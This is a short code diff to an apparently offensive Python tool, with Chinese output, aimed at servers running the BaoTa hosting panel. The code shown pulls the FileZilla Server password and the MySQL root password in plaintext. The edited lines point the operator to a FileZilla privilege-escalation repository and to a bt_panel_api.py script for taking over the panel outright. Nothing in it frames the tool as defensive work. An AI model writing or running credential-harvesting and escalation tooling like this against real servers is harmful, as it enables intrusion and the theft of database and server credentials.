@@ -86,7 +86,7 @@ class BT:
             server = root.findall('./Settings/Item[@name="Last Server Address"]')[0].text
             port = root.findall('./Settings/Item[@name="Last Server Port"]')[0].text
             password = root.findall('./Settings/Item[@name="Last Server Password"]')[0].text
-            return f'已安装！\n{server}:{port} 密码： {password}'
+            return f'已安装！ 使用 https://github.com/Hzllaga/FileZilla_Privilege_Escalation\n{server}:{port} 密码： {password}'
         except FileNotFoundError:
             return '未安装Filezilla'
 
@@ -124,7 +124,7 @@ if __name__ == '__main__':
     print('===========================================')
     print('面板API状态：')
     print(f'{bt.get_api_information()}')
-    print('如果已开启且限制IP为服务器IP可以端口转发直接秒！')
+    print('如果已开启且限制IP为服务器IP可以执行bt_panel_api.py直接秒！')
     print('===========================================')
     print(f'MySQL root密码： {bt.get_mysql_root_password()}')
     print('===========================================')
